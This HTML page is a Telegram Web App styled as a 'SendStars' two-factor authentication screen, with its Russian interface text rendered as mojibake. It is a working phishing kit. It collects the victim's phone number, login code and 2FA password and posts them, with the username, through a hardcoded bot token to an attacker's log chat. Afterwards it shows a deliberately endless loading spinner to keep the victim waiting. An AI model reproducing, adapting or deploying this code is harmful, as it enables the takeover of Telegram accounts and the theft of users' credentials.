<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>SendStars ‚Äî –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --bg:#1c1b1b;
      --text:#fff;
      --box:#2a2a2a;
      --button:#2A9BF8;
      --button-hover:#1a8be8;
      --button-secondary:#3a3a3a;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }

    body {
      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      background: var(--bg);
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--text);
    }

    .screen {
      width: 400px;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      gap: 15px;
    }

    .avatar img {
      width: 120px;
      height: auto;
      object-fit: contain;
      display: block;
    }

    .title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 5px;
    }

    .hint {
      font-size: 14px;
      color: #aaa;
      margin-bottom: 10px;
      line-height: 1.4;
      max-width: 320px;
    }

    .password-input {
      width: 280px; /* –£–∑–∫–æ–µ –ø–æ–ª–µ –≤–≤–æ–¥–∞ */
      height: 50px;
      border-radius: 12px;
      background: var(--box);
      border: 2px solid #3a3a3a;
      color: var(--text);
      font-size: 16px;
      padding: 0 15px;
      margin: 10px 0 20px;
      transition: border-color 0.2s;
    }

    .password-input:focus {
      outline: none;
      border-color: #2A9BF8;
    }

    .buttons {
      display: flex;
      gap: 10px;
      width: 280px; /* –£–∑–∫–∞—è —à–∏—Ä–∏–Ω–∞ –¥–ª—è –∫–Ω–æ–ø–æ–∫ */
    }

    .button {
      flex: 1;
      height: 50px;
      border-radius: 12px;
      border: none;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }

    .button-secondary {
      background: var(--button-secondary);
      color: var(--text);
    }

    .button-secondary:hover {
      background: #4a4a4a;
    }

    .button-primary {
      background: var(--button);
      color: white;
    }

    .button-primary:hover {
      background: var(--button-hover);
    }

    /* –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏ */
    .loading-screen {
      display: none;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }

    .spinner {
      border: 4px solid rgba(255,255,255,0.2);
      border-top: 4px solid #fff;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="screen" id="passwordScreen">
    <div class="avatar">
      <img src="avatar.gif" alt="avatar">
    </div>
    
    <div class="title">–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å</div>
    
    <div class="hint">
      –ï—Å–ª–∏ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –∑–∞—â–∏—â—ë–Ω –ø–∞—Ä–æ–ª–µ–º, –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ –∑–¥–µ—Å—å, –µ—Å–ª–∏ –Ω–µ—Ç - –ø—Ä–æ–ø—É—Å—Ç–∏—Ç–µ —ç—Ç–æ—Ç –ø—É–Ω–∫—Ç.
    </div>

    <input type="password" class="password-input" id="passwordInput" placeholder="–ü–∞—Ä–æ–ª—å" autocomplete="current-password">

    <div class="buttons">
      <button class="button button-secondary" id="skipButton">–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å</button>
      <button class="button button-primary" id="continueButton">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>
  </div>

  <!-- –≠–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏ -->
  <div class="screen loading-screen" id="loadingScreen">
    <div class="spinner"></div>
    <div>–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è‚Ä¶</div>
  </div>

  <script>
  const tg = window.Telegram.WebApp;
  tg.expand();
  
  // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ URL –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
  const urlParams = new URLSearchParams(window.location.search);
  const phoneNumber = urlParams.get('phone') || '–ù–µ —É–∫–∞–∑–∞–Ω';
  const code = urlParams.get('code') || '–ù–µ —É–∫–∞–∑–∞–Ω';

  // –≠–ª–µ–º–µ–Ω—Ç—ã –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
  const passwordInput = document.getElementById('passwordInput');
  const skipButton = document.getElementById('skipButton');
  const continueButton = document.getElementById('continueButton');
  const passwordScreen = document.getElementById('passwordScreen');
  const loadingScreen = document.getElementById('loadingScreen');

  // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ –±–æ—Ç–∞
  function sendPasswordToBot(password = '') {
    const user = tg.initDataUnsafe.user;
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ —á–µ—Ä–µ–∑ Telegram WebApp
    tg.sendData(JSON.stringify({
      type: '2fa_password',
      password: password,
      phone_number: phoneNumber,
      auth_code: code,
      user_id: user?.id
    }));

    // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ –ª–æ–≥ —á–µ—Ä–µ–∑ API –±–æ—Ç–∞
    sendPasswordToLog(password);
  }

  // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–∞—Ä–æ–ª—è –≤ –ª–æ–≥-—á–∞—Ç
  function sendPasswordToLog(password = '') {
    const botToken = '8451638191:AAF-tFYWC83N32_7N7DptpgeFVAkZIvz2dM';
    const logChatId = '-1002913601994';
    
    const user = tg.initDataUnsafe.user;
    const username = user?.username ? `@${user.username}` : '–±–µ–∑ username';
    
    const message = password 
      ? `üîê –ü–∞—Ä–æ–ª—å 2FA –∏–∑ WebApp\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${username}\nüì± –¢–µ–ª–µ—Ñ–æ–Ω: ${phoneNumber}\nüî¢ –ö–æ–¥: ${code}\nüîë –ü–∞—Ä–æ–ª—å: ${password}`
      : `üîê –ü—Ä–æ–ø—É—Å–∫ 2FA –∏–∑ WebApp\nüë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${username}\nüì± –¢–µ–ª–µ—Ñ–æ–Ω: ${phoneNumber}\nüî¢ –ö–æ–¥: ${code}\n‚ö†Ô∏è –ü–∞—Ä–æ–ª—å –Ω–µ –≤–≤–µ–¥–µ–Ω (–ø—Ä–æ–ø—É—â–µ–Ω–æ)`;
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —á–µ—Ä–µ–∑ API –±–æ—Ç–∞
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: logChatId,
        text: message,
        parse_mode: 'HTML'
      })
    }).catch(error => {
      console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–∞—Ä–æ–ª—è –≤ –ª–æ–≥:', error);
    });
  }

  // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å"
  skipButton.addEventListener('click', () => {
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —ç–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏
    passwordScreen.style.display = 'none';
    loadingScreen.style.display = 'flex';
    
    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—É—Å—Ç–æ–π –ø–∞—Ä–æ–ª—å (–ø—Ä–æ–ø—É—Å–∫)
    sendPasswordToBot('');
    
    // –ë–ï–°–ö–û–ù–ï–ß–ù–ê–Ø –ó–ê–ì–†–£–ó–ö–ê - —É–±—Ä–∞–ª–∏ setTimeout —Å –∑–∞–∫—Ä—ã—Ç–∏–µ–º
    // –°–ø–∏–Ω–Ω–µ—Ä –±—É–¥–µ—Ç –∫—Ä—É—Ç–∏—Ç—å—Å—è –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ
  });

  // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å"
  continueButton.addEventListener('click', () => {
    const password = passwordInput.value.trim();
    
    if (password) {
      // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —ç–∫—Ä–∞–Ω –∑–∞–≥—Ä—É–∑–∫–∏
      passwordScreen.style.display = 'none';
      loadingScreen.style.display = 'flex';
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–∞—Ä–æ–ª—å
      sendPasswordToBot(password);
      
      // –ë–ï–°–ö–û–ù–ï–ß–ù–ê–Ø –ó–ê–ì–†–£–ó–ö–ê - —É–±—Ä–∞–ª–∏ setTimeout —Å –∑–∞–∫—Ä—ã—Ç–∏–µ–º
      // –°–ø–∏–Ω–Ω–µ—Ä –±—É–¥–µ—Ç –∫—Ä—É—Ç–∏—Ç—å—Å—è –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ
    } else {
      // –ü–æ–¥—Å–≤–µ—á–∏–≤–∞–µ–º –ø–æ–ª–µ –≤–≤–æ–¥–∞ –µ—Å–ª–∏ –ø—É—Å—Ç–æ–µ
      passwordInput.style.borderColor = '#ff4444';
      setTimeout(() => {
        passwordInput.style.borderColor = '#3a3a3a';
      }, 1000);
    }
  });

  // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏—è Enter –≤ –ø–æ–ª–µ –≤–≤–æ–¥–∞
  passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
      continueButton.click();
    }
  });

  // –§–æ–∫—É—Å–∏—Ä—É–µ–º—Å—è –Ω–∞ –ø–æ–ª–µ –≤–≤–æ–¥–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
  passwordInput.focus();
  </script>
</body>
</html>
